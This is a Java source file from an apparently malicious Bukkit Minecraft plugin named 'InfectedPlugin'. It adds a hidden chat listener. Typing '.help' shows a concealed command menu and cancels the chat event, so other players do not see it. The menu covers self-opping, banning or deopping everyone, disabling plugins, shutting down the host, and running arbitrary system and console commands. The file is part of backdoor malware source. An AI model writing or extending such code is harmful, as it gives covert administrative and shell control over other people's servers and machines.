package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_help implements Listener
{

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        boolean cancel = false;

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".help"))
            {
                p.sendMessage(ChatColor.RED + "Warning: You have to start the commands with . not /");
                p.sendMessage(ChatColor.AQUA + "Commands");
                p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
                p.sendMessage(ChatColor.GOLD + ".disableplugin <plugin> - Disables a plugin of your choice.");
                p.sendMessage(ChatColor.GOLD + ".enableplugin <plugin> - Enables a plugin of your choice.");
                p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
                p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
                p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> - Changes your gamemode.");
                p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                //p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
                p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
                //p.sendMessage(ChatColor.GOLD + ".fuckoff - Wouldn't have a clue."); // Pald update this one.
                p.sendMessage(ChatColor.GOLD + ".terminal <cmd> - Use system commands!");
                p.sendMessage(ChatColor.GOLD + ".explode or .explosion - Explode everyone on the server. Includes you.");
                p.sendMessage(ChatColor.GOLD + ".console <cmd> - Use the console.");
                p.sendMessage(ChatColor.GOLD + ".name <player> <name> - Name a player.");
                p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
                p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
                cancel = true;
            }
        }

        if (cancel)
        {
            event.setCancelled(true);
        }
    }
}